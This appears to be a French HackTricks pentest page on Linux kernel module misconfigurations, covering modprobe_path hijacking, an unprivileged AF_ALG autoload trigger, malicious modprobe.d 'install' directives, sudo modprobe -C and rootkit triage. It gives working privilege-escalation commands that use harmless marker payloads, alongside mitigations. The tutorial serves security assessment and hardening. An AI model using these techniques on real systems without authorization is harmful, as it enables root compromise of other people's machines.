# Modules du noyau et abus de modprobe

{{#include ../../banners/hacktricks-training.md}}

## Mauvaises configurations des modules du noyau et de leur chargement

La prise en charge des modules du noyau est un domaine à fort impact lors de l’analyse d’une escalade de privilèges sous Linux. Ne considérez pas chaque message concernant un module non signé comme exploitable en soi, mais servez-vous-en pour répondre à des questions pratiques.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- L’utilisateur actuel peut-il charger des modules via `sudo`, des capabilities ou un chemin d’aide modifiable ?
- Le chargement des modules est-il toujours activé ?
- La vérification des signatures des modules est-elle désactivée ?
- Les répertoires de modules, les fichiers de modules ou les chemins de configuration `modprobe.d` sont-ils modifiables ?<sup>[[16]](#references)</sup>
- Les journaux du noyau peuvent-ils être lus pour confirmer ce qui s’est passé ?

Le triage rapide commence par les vérifications suivantes de l’état des modules, des signatures, des journaux et de l’arborescence des modules.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interprétation :

- `modules_disabled=1` signifie que les modules ne peuvent être ni chargés ni déchargés, et que la valeur ne peut pas être réinitialisée à `0` avant le redémarrage.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` sur la ligne de commande du noyau ou `CONFIG_MODULE_SIG_FORCE=y` exige des modules signés de manière valide ; sinon, des modules non signés peuvent être chargés et marquer le noyau comme compromis.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` n'impose aucune restriction à `dmesg` ; lorsqu'il vaut `1`, l'accès nécessite `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Les chemins accessibles en écriture sous `/lib/modules/$(uname -r)/` sont dangereux, car `modprobe` parcourt cette arborescence et ses données de dépendances lors du chargement des modules.<sup>[[8]](#references)</sup>

### Charger un module et lire la sortie du noyau

Si vous êtes dûment autorisé à charger un module local, `insmod` insère exactement le fichier `.ko` que vous lui fournissez. La fonction init du module s'exécute pendant le chargement, et les messages écrits avec `printk()` sont envoyés dans le tampon du journal du noyau, que l'on consulte généralement avec `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Un workflow de vérification minimal utilise `modinfo` pour examiner les métadonnées, `insmod` et `rmmod` pour charger et supprimer un module, `lsmod` pour confirmer son état de chargement, et `dmesg` pour examiner les journaux du noyau.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Si `sudo -l` autorise `insmod`, `modprobe` ou un wrapper autour de ces commandes, considérez cela comme critique : `sudo -l` répertorie les privilèges de l'utilisateur appelant, et le chargement d'un module du noyau nécessite `CAP_SYS_MODULE`. Consultez [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) pour connaître les méthodes directes reposant sur les capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` autorisé via sudo

Une règle sudo qui autorise un utilisateur à exécuter `insmod` n’est pas comparable à l’autorisation d’utiliser un utilitaire administratif ordinaire. Le code d’initialisation du module s’exécute lors de son insertion ; la question pratique à examiner est donc de savoir si cet utilisateur peut choisir ou modifier le module chargé.<sup>[[3]](#references)</sup>

Le flux d’examen générique suivant reprend ces vérifications d’inspection, de chargement, d’état, de journal et de suppression pour un module candidat.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Si l’utilisateur peut fournir un fichier `.ko` arbitraire, il faut considérer cela comme une compromission complète du système dans le cadre d’une évaluation autorisée. Une pratique opérationnelle plus sûre consiste à éviter de déléguer le chargement de modules via sudo ; si cela est inévitable, limitez précisément le chemin, la propriété, les permissions, la politique de signature et le processus de suppression.<sup>[[3]](#references)[[10]](#references)</sup>

Pour une méthode de compilation de module sans danger dans un laboratoire contrôlé, un code source minimal et un Makefile sont présentés ci-dessous ; la forme `make -C /lib/modules/$(uname -r)/build M=$PWD` suit le workflow kbuild documenté par le noyau pour les modules externes.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Construisez et chargez uniquement dans un laboratoire autorisé ; kbuild compile le module externe et les commandes de chargement et de suppression font appel aux interfaces des modules du noyau.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Vérifications d’abus de `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` désigne l’assistant userspace que le noyau exécute pour les demandes de chargement automatique de modules ; ce sysctl affecte le chargement automatique, et non l’insertion explicite de modules. Si un attaquant peut le modifier pour qu’il pointe vers un exécutable accessible en écriture et déclencher une demande de module, cet assistant devient une voie d’exécution de code privilégiée. Le définir sur une chaîne vide désactive les demandes de chargement automatique ; si `CONFIG_STATIC_USERMODEHELPER=y`, toute valeur non vide est remplacée par le chemin de l’assistant statique intégré à la compilation.<sup>[[1]](#references)</sup>

Vérifiez le chemin actuel de l’assistant via l’interface sysctl du noyau, puis inspectez le propriétaire et les permissions de la cible.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Vérifiez s'il est possible d'influencer sysctl, les règles sudo déléguées ou les capacités de fichiers.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Le modèle suivant, réservé au lab, modifie le chemin du helper et déclenche une requête documentée de chargement automatique d’un module ; utilisez-le uniquement sur un système isolé et autorisé.<sup>[[1]](#references)</sup>

Sur les noyaux Linux actuels, n’utilisez pas un exécutable inconnu comme déclencheur générique : le chargement automatique de modules pour les anciens formats binaires personnalisés a été supprimé dans Linux 6.14, tandis que la documentation du noyau indique qu’un type de système de fichiers inconnu peut déclencher une requête de chargement automatique d’un module.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Sur les systèmes renforcés, cette opération devrait échouer si les permissions empêchent les utilisateurs non privilégiés d’écrire dans `kernel.modprobe`, si le chemin de l’assistant n’est pas accessible en écriture ou si le chargement automatique des modules est désactivé.<sup>[[1]](#references)</sup>

### Déclencheur de chargement automatique AF_ALG sans privilèges

Le déclencheur du système de fichiers ci-dessus utilise `mount`, une commande privilégiée.<sup>[[1]](#references)</sup> Lorsque les sockets AF_ALG sont disponibles, un utilisateur non privilégié peut plutôt en lier un à un type délibérément inexistant.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` demande alors `algif-<type>` via `request_module()`, qui invoque l’assistant de module configuré.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Cela fonctionne toujours après la suppression, dans Linux 6.14, du chargement automatique historique des formats binaires inconnus.<sup>[[11]](#references)[[17]](#references)</sup> Un échec de `bind()` est attendu puisque le type n’existe pas ; vérifiez plutôt l’effet secondaire produit par l’assistant que la valeur de retour du socket.<sup>[[17]](#references)[[18]](#references)</sup>

Dans un lab autorisé, configurez d’abord l’assistant contrôlé ou la règle `modprobe.d`, puis déclenchez une requête sans `sudo` ni `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ accepte un tuple de liaison AF_ALG `(type, name)`.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Ce chemin nécessite un socket AF_ALG utilisable et une valeur non vide pour `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> Sur les noyaux avec `/proc/sys/crypto/af_alg_restrict`, la valeur `2` désactive la création de sockets AF_ALG ; la valeur `1` restreint les algorithmes, mais n’empêche pas la requête de type manquant dans `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> Un LSM peut rejeter la requête de module avant l’appel de l’helper.<sup>[[19]](#references)</sup>

### Configuration `modprobe.d` accessible en écriture et `sudo modprobe -C`

Avant de résoudre un module, `modprobe` lit les fichiers `.conf` dans des répertoires de configuration tels que `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` et `/lib/modprobe.d`, par ordre de priorité. Un fichier portant le même nom dans un répertoire de priorité supérieure masque le fichier de priorité inférieure. Plus important encore, une directive `install <module> <command>` exécute une commande shell arbitraire **à la place** de l’insertion de ce module. Par conséquent, un chemin de configuration accessible en écriture peut permettre une exécution de commande différée avec les privilèges d’un appelant ultérieur de `modprobe` disposant de privilèges élevés ; l’application de la signature des modules du noyau n’authentifie pas cette commande en espace utilisateur.<sup>[[16]](#references)</sup>

Vérifiez les permissions des répertoires et des fichiers, puis inspectez la configuration effective. `modprobe -n -v` permet d’examiner la résolution en toute sécurité, car le mode simulation n’insère pas le module et n’exécute aucune commande `install`/`remove`. Préférez `modprobe -c` à l’ancienne option `--showconfig`, que la documentation actuelle de kmod indique comme devant être supprimée après kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Une règle sudo sans restriction pour `modprobe` est exploitable même si les fichiers `.ko` arbitraires ne peuvent pas passer la vérification de signature : `-C` permet de sélectionner un répertoire de configuration contrôlé par l’attaquant, depuis lequel une commande `install` peut être exécutée par le processus lancé via sudo.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Si un répertoire `modprobe.d` visible par le programme d’assistance du noyau est accessible en écriture, le même [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) peut exécuter immédiatement une directive `install algif-htprobe`, sans attendre qu’un administrateur appelle `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> Dans un lab autorisé, placez une commande inoffensive qui crée un marqueur dans un fichier `.conf` accessible en écriture, vérifiez la résolution avec `modprobe -n -v algif-htprobe`, puis exécutez le trigger ci-dessus.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` et l’application des signatures de modules bloquent l’insertion de modules, pas cette commande `install` en espace utilisateur ; une valeur vide pour `kernel.modprobe` ou un chemin AF_ALG bloqué empêche bien cette voie d’autoload.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Pour atténuer le risque, n’accordez pas via sudo un accès à `modprobe` sans restriction sur les arguments, gardez tous les répertoires de configuration appartenant à root et non modifiables, et examinez les directives `install`/`remove` inattendues. Lorsqu’un workflow administratif de confiance doit contourner ces directives pour un module, `modprobe --ignore-install` les ignore pour le module indiqué, mais les dépendances peuvent toujours avoir leurs propres commandes.<sup>[[8]](#references)[[16]](#references)</sup>

### Vérification des répertoires `/lib/modules` modifiables

Des répertoires de modules modifiables peuvent permettre le remplacement de modules, l’installation de modules malveillants ou l’abus du chargement automatique, selon la manière dont `modprobe` est ensuite invoqué ; `modprobe` recherche dans `/lib/modules/$(uname -r)` et utilise les données de dépendances qui s’y trouvent pour résoudre les modules.<sup>[[8]](#references)</sup>

Vérifiez les fichiers de modules modifiables ainsi que les métadonnées de dépendances et d’alias dans l’arborescence des modules correspondant à la version active du noyau.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Si vous trouvez du contenu de module modifiable, examinez comment modprobe résout les dépendances et comment modinfo affiche les métadonnées du module.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Notes défensives :

- Gardez `/lib/modules` sous la propriété de `root:root` et non modifiable par les utilisateurs.<sup>[[8]](#references)</sup>
- Définissez `kernel.modules_disabled=1` après le démarrage lorsque cela est possible sur le plan opérationnel.<sup>[[1]](#references)</sup>
- Appliquez la signature des modules sur les systèmes qui nécessitent des modules chargeables.<sup>[[2]](#references)</sup>
- Surveillez les écritures dans `/proc/sys/kernel/modprobe`, `/lib/modules` et les répertoires de configuration `modprobe.d`, ainsi que toute exécution inattendue de `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triage des rootkits basés sur des modules

Un module malveillant peut intercepter les appels système, les vues VFS ou `/proc`, les chemins réseau ou les vérifications d’identifiants afin de masquer des processus et des fichiers, de rediriger le trafic ou d’intercepter des secrets. Il peut aussi se retirer de la liste des modules affichée par `lsmod`. La persistance peut provenir d’alias ou de règles d’installation dans `modprobe.d`, de `/etc/modules-load.d`, d’une unité systemd, du contenu de l’initramfs ou du remplacement d’un fichier `.ko` légitime. Un résultat normal de `lsmod` constitue un élément utile, mais une compromission au niveau du noyau peut rendre peu fiables les listes fournies par le noyau. Recoupez les modules chargés, les fichiers sur disque, la configuration de démarrage, les journaux de chargement des modules et la télémétrie externe de confiance.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Examinez les noms de modules, chemins, dépendances, signatures et moments de chargement inattendus. Les messages de taint du kernel et de module non signé sont des pistes, pas des preuves de la présence d’un rootkit. Si vous suspectez un rootkit, recueillez des preuves depuis une image ou un environnement de récupération de confiance avant de vous fier aux sorties du kernel en cours d’exécution. La page [évaluation des vulnérabilités du kernel](kernel-vulnerability-assessment.md) traite de la configuration et de l’exposition des diagnostics, notamment tracefs et les objets BPF épinglés.



## References

- [1] [Documentation de /proc/sys/kernel/ — Documentation du noyau Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Fonction de signature des modules du kernel — Documentation du noyau Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Page de manuel Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Bases des pilotes — Documentation du noyau Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Journalisation des messages avec printk — Documentation du noyau Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Compilation de modules externes — Documentation du noyau Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Page de manuel Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Fusion de l’étiquette « execve-v6.14-rc1 » — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Page de manuel Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Page de manuel Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Relancer la technique modprobe_path : contourner le correctif search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [Liaison AF_ALG et demande de module — Code source du noyau Linux](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Invocation de l’assistant de module — Code source du noyau Linux](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Documentation Python](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Documentation du noyau Linux](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
